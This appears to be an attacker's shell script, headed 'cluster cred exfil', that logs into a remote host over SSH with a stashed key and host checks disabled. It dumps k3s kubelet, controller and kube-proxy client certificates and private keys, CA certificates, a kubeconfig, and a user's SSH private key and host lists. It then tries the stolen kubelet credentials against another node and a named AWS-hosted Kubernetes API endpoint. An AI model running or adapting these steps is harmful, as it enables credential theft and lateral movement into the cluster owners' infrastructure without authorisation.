echo "=== 221 cluster cred exfil ==="
cat > /tmp/r5.sh <<'RSH'
#!/bin/bash
echo "=== client-kubelet ==="
sudo cat /var/lib/rancher/k3s/agent/client-kubelet.crt /var/lib/rancher/k3s/agent/client-kubelet.key
echo "=== client-k3s-controller ==="
sudo cat /var/lib/rancher/k3s/agent/client-k3s-controller.crt /var/lib/rancher/k3s/agent/client-k3s-controller.key
echo "=== kubeproxy ==="
sudo cat /var/lib/rancher/k3s/agent/client-kube-proxy.crt /var/lib/rancher/k3s/agent/client-kube-proxy.key
echo "=== CAs ==="
sudo cat /var/lib/rancher/k3s/agent/server-ca.crt /var/lib/rancher/k3s/agent/client-ca.crt 2>/dev/null
echo "=== etc dir ==="
sudo ls -laR /var/lib/rancher/k3s/agent/etc/ 2>/dev/null | head -30
echo "=== k3scontroller.kubeconfig ==="
sudo cat /var/lib/rancher/k3s/agent/k3scontroller.kubeconfig
echo "=== direct kubelet test .103 ==="
sudo curl -sk --max-time 6 --cert /var/lib/rancher/k3s/agent/client-kubelet.crt --key /var/lib/rancher/k3s/agent/client-kubelet.key https://85.234.79.103:10250/pods -w "\nHTTP:%{http_code}\n" | head -c 800
echo
echo "=== direct ELB API test ==="
sudo curl -sk --max-time 8 --cert /var/lib/rancher/k3s/agent/client-kubelet.crt --key /var/lib/rancher/k3s/agent/client-kubelet.key --cacert /var/lib/rancher/k3s/agent/server-ca.crt https://k3s-h100-novita-k8s-69c5d56e-119c2232ba991a2f.elb.us-west-2.amazonaws.com:6443/api/v1/nodes -w "\nHTTP:%{http_code}\n" | head -c 1000
echo
echo "=== ubuntu key ==="
sudo cat /home/ubuntu/.ssh/id_ed25519
echo "=== ubuntu known_hosts ==="
sudo grep -oE "^(85\.234\.[0-9.]+|100\.[0-9.]+|[a-z0-9.-]+) " /home/ubuntu/.ssh/known_hosts 2>/dev/null | sort -u | head -20
echo "=== ubuntu ssh config ==="
sudo cat /home/ubuntu/.ssh/config 2>/dev/null | head -20
RSH
chmod +x /tmp/r5.sh
timeout 110 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/r5.sh 2>&1 | head -200
echo "=== B21DONE ==="
